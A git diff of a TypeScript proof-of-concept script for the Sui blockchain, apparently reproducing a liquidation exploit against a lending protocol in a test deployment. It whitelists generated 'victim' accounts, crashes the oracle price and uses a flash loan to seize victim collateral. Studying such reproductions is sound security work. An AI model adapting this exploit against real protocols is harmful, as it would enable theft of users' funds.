@@ -36,6 +36,32 @@ const funderAddress = funderKeypair.getPublicKey().toSuiAddress();
 
 console.log(`[INIT] Funder Address: ${funderAddress}`);
 
+// ==================== HELPER: CARI ADMIN CAP ====================
+async function findAdminCap(): Promise<string> {
+    console.log("[INIT] Searching for AdminCap...");
+    let cursor = null;
+    while (true) {
+        const objects = await client.getOwnedObjects({
+            owner: funderAddress,
+            cursor,
+            options: { showType: true },
+        });
+        for (const obj of objects.data) {
+            const objType = obj.data?.type || "";
+            if (objType.includes(`${PKG}::app::AdminCap`)) {
+                console.log(`[INIT] AdminCap found: ${obj.data.objectId}`);
+                return obj.data.objectId;
+            }
+        }
+        if (!objects.hasNextPage) break;
+        cursor = objects.nextCursor;
+    }
+    throw new Error(
+        "[INIT] AdminCap not found in funder address. " +
+        "Make sure funder is the deployer of the protocol."
+    );
+}
+
 // ==================== HELPER FUNCTIONS ====================
 
 async function executeTx(tx, keypair) {
@@ -84,9 +110,25 @@ async function readObligationState(obligationId) {
     return { collateralAmount, debtUSDC, debtETH };
 }
 
+// ==================== WHITELIST VICTIM ====================
+async function whitelistVictim(adminCapId, victimAddr, label) {
+    console.log(`[${label}] Step 2.5: Whitelisting victim ${victimAddr.slice(0, 8)}...`);
+    const tx = new Transaction();
+    tx.moveCall({
+        target: `${PKG}::app::add_whitelist_address`,
+        arguments: [
+            tx.object(adminCapId),
+            tx.object(MARKET),
+            tx.pure.address(victimAddr),
+        ],
+    });
+    await executeTx(tx, funderKeypair);
+    console.log(`[${label}] Step 2.5 done: Victim whitelisted`);
+}
+
 // ==================== PHASE 1: SETUP VICTIM ====================
 
-async function setupVictim(victimKeypair, label) {
+async function setupVictim(victimKeypair, label, adminCapId) {
     const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
     console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
 
@@ -98,8 +140,6 @@ async function setupVictim(victimKeypair, label) {
     console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);
 
     // --- STEP 2: Open Obligation menggunakan open_obligation_entry ---
-    // Menggunakan fungsi entry agar obligation langsung di-share secara internal
-    // tanpa perlu menangani hot potato di sisi TypeScript.
     const openTx = new Transaction();
     openTx.moveCall({
         target: `${PKG}::open_obligation::open_obligation_entry`,
@@ -108,13 +148,10 @@ async function setupVictim(victimKeypair, label) {
     const openResult = await executeTx(openTx, victimKeypair);
     console.log(`[${label}] Step 2 done: Obligation opened`);
 
-    // FIX: Gunakan else if agar obligationId dan obligationKeyId tidak saling
-    // menimpa satu sama lain ketika objectType mengandung string yang sama.
     let obligationId = "";
     let obligationKeyId = "";
     for (const obj of openResult.objectChanges || []) {
         if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) {
-            // Periksa ObligationKey lebih dulu karena stringnya lebih spesifik
             obligationKeyId = obj.objectId;
         } else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) {
             obligationId = obj.objectId;
@@ -122,19 +159,16 @@ async function setupVictim(victimKeypair, label) {
     }
 
     if (!obligationId || !obligationKeyId) {
-        throw new Error(
-            `[${label}] Failed to parse obligationId or obligationKeyId.\n` +
-            `objectChanges: ${JSON.stringify(openResult.objectChanges, null, 2)}`
-        );
+        throw new Error(`[${label}] Failed to parse obligationId or obligationKeyId.`);
     }
 
     console.log(`[${label}] Obligation ID:    ${obligationId}`);
     console.log(`[${label}] ObligationKey ID: ${obligationKeyId}`);
 
+    // --- STEP 2.5: Whitelist victim address di market ---
+    await whitelistVictim(adminCapId, victimAddr, label);
+
     // --- STEP 3: Deposit SUI Collateral ---
-    // Split langsung dari gas dalam PTB yang sama.
-    // Hasil splitCoins adalah TransactionArgument — langsung pakai tanpa tx.object().
-    // [Transaction Basics](https://sdk.mystenlabs.com/sui/transactions/basics#return-values "kapa-citation")
     const depositTx = new Transaction();
     const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
     depositTx.moveCall({
@@ -144,33 +178,23 @@ async function setupVictim(victimKeypair, label) {
             depositTx.object(VERSION),
             depositTx.object(obligationId),
             depositTx.object(MARKET),
-            collateralCoin, // TransactionArgument langsung dari splitCoins
+            collateralCoin,
         ],
     });
     await executeTx(depositTx, victimKeypair);
     console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);
 
     // --- STEP 4: Mint & Supply USDC & ETH ke Market ---
-    // Semua argumen numerik menggunakan tx.pure.u64() secara eksplisit.
-    // [Commands Reference](https://sdk.mystenlabs.com/sui/transactions/reference "kapa-citation")
     const supplyTx = new Transaction();
 
     const [usdcCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::usdc::mint`,
-        arguments: [
-            supplyTx.object(USDC_TREASURY),
-            supplyTx.pure.u64(100_000_000_000_000n),
-        ],
+        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)],
     });
     const [sUSDC] = supplyTx.moveCall({
         target: `${PKG}::mint::mint`,
         typeArguments: [USDC_TYPE],
-        arguments: [
-            supplyTx.object(VERSION),
-            supplyTx.object(MARKET),
-            usdcCoin,
-            supplyTx.object(CLOCK),
-        ],
+        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)],
     });
     supplyTx.moveCall({
         target: `0x2::coin::destroy_zero`,
@@ -180,20 +204,12 @@ async function setupVictim(victimKeypair, label) {
 
     const [ethCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::eth::mint`,
-        arguments: [
-            supplyTx.object(ETH_TREASURY),
-            supplyTx.pure.u64(10_000_000_000n),
-        ],
+        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)],
     });
     const [sETH] = supplyTx.moveCall({
         target: `${PKG}::mint::mint`,
         typeArguments: [ETH_TYPE],
-        arguments: [
-            supplyTx.object(VERSION),
-            supplyTx.object(MARKET),
-            ethCoin,
-            supplyTx.object(CLOCK),
-        ],
+        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)],
     });
     supplyTx.moveCall({
         target: `0x2::coin::destroy_zero`,
@@ -256,11 +272,7 @@ async function crashOraclePrice() {
     tx.moveCall({
         target: `${PKG}::x_oracle::update_price`,
         typeArguments: [SUI_TYPE],
-        arguments: [
-            tx.object(ORACLE),
-            tx.object(CLOCK),
-            tx.pure.u64(40_000_000n),
-        ],
+        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000n)],
     });
     await executeTx(tx, funderKeypair);
     console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
@@ -281,11 +293,7 @@ async function beforeExploit_singleCall(victimObligationId) {
     const [flashUSDC, flashReceipt] = tx.moveCall({
         target: `${PKG}::flash_loan::borrow_flash_loan`,
         typeArguments: [USDC_TYPE],
-        arguments: [
-            tx.object(VERSION),
-            tx.object(MARKET),
-            tx.pure.u64(50_000_000_000n),
-        ],
+        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
     });
 
     const [remainUSDC, collateralCoin] = tx.moveCall({
@@ -305,12 +313,7 @@ async function beforeExploit_singleCall(victimObligationId) {
     tx.moveCall({
         target: `${PKG}::flash_loan::repay_flash_loan`,
         typeArguments: [USDC_TYPE],
-        arguments: [
-            tx.object(VERSION),
-            tx.object(MARKET),
-            remainUSDC,
-            flashReceipt,
-        ],
+        arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt],
     });
 
     tx.transferObjects([collateralCoin], funderAddress);
@@ -407,11 +410,13 @@ async function main() {
     console.log("\n[DEBUG] Checking Funder Balances...");
     await printBalances(funderAddress);
 
+    const adminCapId = await findAdminCap();
+
     const victimA = Ed25519Keypair.generate();
     const victimB = Ed25519Keypair.generate();
 
-    const vA = await setupVictim(victimA, "VICTIM A");
-    const vB = await setupVictim(victimB, "VICTIM B");
+    const vA = await setupVictim(victimA, "VICTIM A", adminCapId);
+    const vB = await setupVictim(victimB, "VICTIM B", adminCapId);
 
     await crashOraclePrice();
 
